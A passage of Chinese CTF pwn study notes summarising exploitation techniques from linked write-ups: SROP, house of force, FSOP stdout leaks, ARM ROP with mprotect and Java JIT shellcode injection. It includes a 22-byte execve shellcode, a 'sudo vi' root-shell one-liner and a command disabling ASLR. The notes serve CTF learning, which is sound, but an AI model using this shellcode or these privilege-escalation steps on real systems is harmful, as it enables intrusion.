- FSOP各种利用链。里面提到了另一篇[帖子](https://chovid99.github.io/posts/stack-the-flags-ctf-2022/)，两者都提到了一种关于libc地址（偏移）的技巧。如果程序允许malloc任意大小的chunk，就可以尝试申请较大的chunk。根据malloc的特性，这个较大地址的chunk会从mmap分配，地址会正好处于libc的上方，且与libc基址的偏移是固定的。帖子还提到了利用FILE结构体泄露libc地址的方法。
53. [warmup](https://blog.csdn.net/Morphy_Amo/article/details/123660489)
- 程序内提供了很多系统调用（alarm，read，write等），但函数较少。rop时就要用系统调用来执行orw。
- alarm函数特性：alarm()用来设置信号SIGALRM 在经过参数seconds 指定的秒数后传送给目前的进程. 如果参数seconds 为0, 则之前设置的闹钟会被取消, 并将剩下的时间返回。意思就是说，程序最开始调用`alarm(10)`，如果4秒后再次调用alarm，返回值就是10-4=6，存在eax里。于是配合这题的syscall即可执行orw缺少的open函数。
54. 假如vi命令有root权限（使用`sudo -l`查看），可用`sudo vi -c ':!/bin/sh' /dev/null`获取完整root权限shell。
55. 调试带有PIE的文件时，关闭自己环境的ASLR会有助于调试。`echo 0 > /proc/sys/kernel/randomize_va_space`。同理，就算一个文件开启了PIE，但远程服务器如果没有开启ASLR，那么PIE就没用了，直接用无PIE时的思路做题即可。

```
在Linux中，/proc/sys/kernel/randomize_va_space中的值就是ASLR的配置：
0: 关闭了ASLR，没有随机化保护。
1: 开启部分随机化，系统中的动态库和栈会使用随机化地址，而其他内存区域则使用固定地址。
2: 开启完全随机化，ASLR将随机化所有内存区域的地址：在这个级别中，ASLR将随机化所有内存区域的地址，包括库的加载地址、堆地址、栈地址、内存映射的地址、共享内存段的地址以及虚拟动态内存的地址。
```

56. [更换程序使用的libc](https://bbs.kanxue.com/thread-271583.htm)。如果题目提供了libc但本地运行程序默认使用的libc却不是题目的，可以更换掉。libc可以在[这里](https://github.com/matrix1001/glibc-all-in-one)找。
```
patchelf --set-interpreter ~/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/ld-2.27.so pwn
patchelf --replace-needed libc.so.6 ~/glibc-all-in-one-master/libs/2.27-3ubuntu1_amd64/libc-2.27.so pwn
```
57. [360chunqiu2017_smallest](https://www.anquanke.com/post/id/217081)
- SROP。当无sigreturn gadget时，可以尝试将rax改为15（系统调用号），然后执行syscall是一样的结果。注意函数的返回值也是存在rax里，要是没有pop rax，可输入任意个字节的read函数也是不错的选择。
- SROP的本质是：内核态返回用户态时的恢复栈帧。因此构造的payload sigframe各个参数的值对应恢复时想要让栈变成的样子。调用sigreturn是为了恢复构造的假sigframe。一旦sigreturn被调用，rsp紧跟着的数据就会被视为要恢复的sigframe。一般getshell就是sys_execve。
- sigframe的前几个字节被覆盖不会影响SROP。
58. [bctf2016_bcloud](https://ctf-wiki.org/en/pwn/linux/user-mode/heap/ptmalloc2/house-of-force/#2016-bctf-bcloud)
- house of force利用。要求：
  - 可申请任意大小的堆块
  - 可覆盖top chunk的size
  - 已知想要分配处的地址和top chunk地址的偏移（或
- 计算house of force需要申请的堆块大小。目标地址-top chunk地址-size_t-malloc_allign。32位的size_t=4,malloc_allign=7;64位size_t=8,malloc_allign=0xf.
59. [whoami](../../CTF/攻防世界/5级/Pwn/whoami.md)
- 64位连续多次栈迁移至bss段。
- system函数执行时需要注意爆栈。如果一次栈迁移无法执行system，那就迁移多次，让栈环境满足调用system的条件。
60. [npuctf_2020_bad_guy](https://blog.csdn.net/csdn546229768/article/details/123717993)
- 无show堆题[使用IO_FILE（_IO_2_1_stdout_）泄露libc](https://www.jianshu.com/p/27152c14e2e7).通常需要满足：
  - 将_flags设置为0xfbad18**。目的是为了设置_IO_CURRENTLY_PUTTING=0x800，_IO_IS_APPENDING=0x1000，IO_MAGIC=0xFBAD0000 （这里关系到puts的实现）
  - 设置_IO_write_base指向想要泄露的地方；_IO_write_ptr指向泄露结束的地址。
  - 之后遇到puts或printf，就会将_IO_write_base指向的内容打印出来。
  - 常见payload:`p64(0xfbad1800)+p64(0x0)*3+'\x00'`。其中`0xfbad1800`为_flags的值，不同版本的libc会有变化。似乎无需改动_IO_write_base的值。
- 为了设置stdout为想要的值，一般利用unsorted bin中chunk的fd字段的main_arena相关值，覆盖最后两个字节为到__IO_2_1_stdout的正上方处（满足fakechunk的size，如0x7f的地方即可）。从左往右数的第一个数字需要爆破需要爆破。可以看出需要堆溢出漏洞。
61. [wustctf2020_babyfmt](https://www.cnblogs.com/LynneHuan/p/15229706.html)
- 下面的代码：
```c
__isoc99_scanf(&%ld,&local_18);
printf("ok! time is %ld\n",local_18);
```

当输入不符合`%ld`的字符，例如a时，不会修改栈，而是会泄露栈上的信息。
- c语言里的close(1)会关闭stdout，导致无法输出。此时配合格式化字符串漏洞，有两种办法解决：
  - 假如使用printf输出需要的内容。因为printf会使用stdout的指针，所以可以在printf执行前将stdout的指针改成stderr的。[这种方法](https://blog.csdn.net/weixin_44145820/article/details/105992952)需要获取stderr倒数第二个byte（倒数第一个通常是固定的），如果没有只能爆破。
  - 利用栈上的格式化字符串修改stdout的fileno为2。
62. [shanghai2018_baby_arm](https://www.cnblogs.com/xshhc/p/16936894.html#tid-YG6XSx)
- [arm](https://blog.csdn.net/qq_41028985/article/details/119407917) aarch64 架构的 ret2csu rop题目。程序开启了nx但没有开启pie。于是写入调用[mprotect](https://www.cnblogs.com/Max-hhg/articles/13939064.html)的gadget，将shellcode存放处改为可执行。mprotect各个枚举的对应的数字值：
```
PROT_READ: 1
PROT_WRITE: 2
PROT_EXEC: 4
PROT_SEM: 8
```

可以使用位运算同时增加多种权限。例如可读可写可执行：PROT_READ | PROT_WRITE | PROT_EXEC=7 (1 + 2 + 4).
- arm运行+调试环境[布置](https://blog.csdn.net/A951860555/article/details/116780827)。
  - 安装qemu
```
sudo apt update
sudo apt install qemu
```
  - 安装arm相关库。
```
sudo apt search "libc6" | grep arm
sudo apt install libc6-arm64-cross
```
  - 运行
```
qemu-aarch64 -L /usr/aarch64-linux-gnu/ ./prog
```
  - 如果没有aarch64 的汇编器，pwntools里面制定context为aarch64会报错。
```
apt search binutils| grep aarch64
sudo apt install bintuils-aarch64-linux-gnu-dbg
```
63. [Contrived Shellcode](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/contrived-shellcode)
- 仅用0-15的字节构建shellcode。可在[此处](http://ref.x86asm.net/coder64.html#x77)参考哪些inst可以用。
- [方法1](https://chovid99.github.io/posts/tamuctf-2023/#contrived-shellcode):因为允许的字节范围内包含大量add，or和syscall，但每个操作数只能是32位寄存器。于是将getshell分为3个syscall：chdir('/')；chdir('bin')；execve('sh')。
- [方法2](https://github.com/tj-oconnor/ctf-writeups/tree/main/tamu_ctf_23/contrived-shellcode):构建read的syscall，将getshell的shellcode读取到read执行处的后面，进而绕过过滤。
64. [Randomness](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/randomness)
- 不同函数之间的局部变量栈帧公用。有两个函数：
```c
void foo() {
    unsigned long seed;
}

void bar() {
    unsigned long a;
}
int main() {
    foo();
    bar();
}
```
main函数调用foo返回后调用bar，这时栈帧会残留着seed的值，于是a默认就带着seed的值。
- scanf的错误使用。`scanf("%lu", a);`是错误的，会往a的值而不是a的地址里存值。正确写法是`scanf("%lu", &a);`
65. 仅22字节的x86-64 shellcode：https://systemoverlord.com/2016/04/27/even-shorter-shellcode.html
```
BITS 64

xor esi, esi
push rsi
mov rbx, 0x68732f2f6e69622f
push rbx
push rsp
pop rdi
imul esi
mov al, 0x3b
syscall

shellcode = b'1\xf6VH\xbb/bin//shST_\xf7\xee\xb0;\x0f\x05'
```
66. [Macchiato](https://github.com/tamuctf/tamuctf-2023/tree/master/pwn/macchiato):[wp](https://astr.cc/blog/tamuctf-2023-writeup/#macchiato)
- java pwn。java中的JIT区域有地址可读可写可执行，如果有方法将shellcode写到这块区域，就能getshell。当JIT跳到shellcode处时，当前执行的shellcode会无限期挂起，需要ctrl+c终止执行才能执行shellcode。
- Java long整型溢出。当值超过-Long.MAX_VALUE时，会转换为整数。下限是-0x7fffffffffffffff-2，到这个数就会变为long的正最大值。
- java会缓存值在-128 到 127（包含）java.lang.Long (boxed longs，装箱的long)实例对象，并在自动装箱时会使用。用于存储的对象是：
```java
// https://github.com/openjdk/jdk11/blob/master/src/java.base/share/classes/java/lang/Long.java#L1147-L1156
private static class LongCache {
    private LongCache(){}

    static final Long cache[] = new Long[-(-128) + 127 + 1];

    static {
        for(int i = 0; i < cache.length; i++)
            cache[i] = new Long(i - 128);
    }
}
```
如果修改这个数组，会导致某些long数字表示的值不是其真正的值。例如对于下面的代码：
```java
private boolean checkBounds(Long index) {
    var geMin = index.compareTo(0L) >= 0;
    var ltMax = index.compareTo(10L) < 0;
    return geMin && ltMax;
}
```

10L对应cache里索引138的数字。如果把138处改为最小值，就能绕过`index.compareTo(10L) < 0`。
- 根据hash的存储位置判断jvm实例对象在jvm heap里的存储位置。`对象.hashCode()`可以获取某个对象的hash。这个hash在每一个jvm对象里都有，存在对象带有metadata的头部里（[header that stores metadata about the object](https://shipilev.net/jvm/objects-inside-out/#_mark_word)）。一般来说，hash在头部开始的几个字节里。接着根据目标被分配顺序的先后（越早分配的对象地址越低，静态数组优先于对象加载）判断是往header上看还是往header下看。OpenJDK 11中默认8字节对齐，寻找的时候hash一定完整地在某一个chunk里。这里以对象内唯一的非静态字段arr为例，找到hash所在地址后，往后再走12个字节（12 bytes past the beginning of the object header，mark word 8字节，klass pointer 4字节）就是arr的地址了（arr是对象内唯一的非静态字段，地址直接就在header后）。
- 计算任意写地址。假设数组arr有越界写漏洞，以某种方法拿到4个字节的地址后，再加上16(mark word 8 字节, klass pointer, 4字节，以及数组长度4字节)。拿任何目标地址减去算出来的这个值再除以8，就是任意写数组的索引。
- 通常来说，OpenJDK 11从地址0x800000000开始，会映射0x2000个字节作为RWX段。该区域在0x800001f60后无填充，且地址基本是固定的，不过有几个trampoline entries用于跳转到加载的方法。于是可以将shellcode注入到0x800001f60这个地址，然后将其中一个trampoline entry patch成jump到shellcode。第一个trampoline entry用的尤其多，位于0x800000000。或者直接把shellcode写到0x800000100，前面全部用nop填充。